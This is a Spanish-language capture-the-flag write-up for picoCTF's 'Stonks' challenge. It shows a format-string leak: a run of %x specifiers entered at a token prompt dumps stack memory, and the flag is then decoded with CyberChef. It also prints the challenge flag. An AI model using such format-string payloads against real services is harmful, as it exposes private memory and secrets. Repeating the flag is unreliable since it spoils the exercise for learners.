## Objetivo 

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Solución  


ingresamos al launcher que nos da el reto
```java 
┌──(kali㉿kali)-[~/Downloads/stonks]
└─$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?

```

no pide un token, ingresamos %x%x para que nos de un codigo en hexadecimal
```java 
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
8a5e3b0804b00080489c3f7f52d80ffffffff18a5c160f7f60110f7f52dc708a5d18018a5e3908a5e3b06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffc0007df7f8daf8f7f60440daac150010f7defce9f7f610c0f7f525c0f7f52000ffc03368f7de068d
Portfolio as of Wed Nov 13 07:08:46 UTC 2024

1 shares of HTY
1 shares of HAH
11 shares of K
117 shares of PKFT
101 shares of BMUI
191 shares of TTF
Goodbye!

```

con ayuda de cyber chef transformamos el código  dado con las recetas ***swap endiannes*** y ***from hex*** lo convertimos

![[Pasted image 20241113011455.png]]


a partir de la ultima "F" que tenemos en el codigo dado (el conjunto fffffff) damos supirmir y la salida ira cambiando, vamos suprimiendo y checando la salida hasta que nos dé la bandera 

![[Pasted image 20241113011636.png]]


**picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}**


## Notas Adicionales 

### Referencias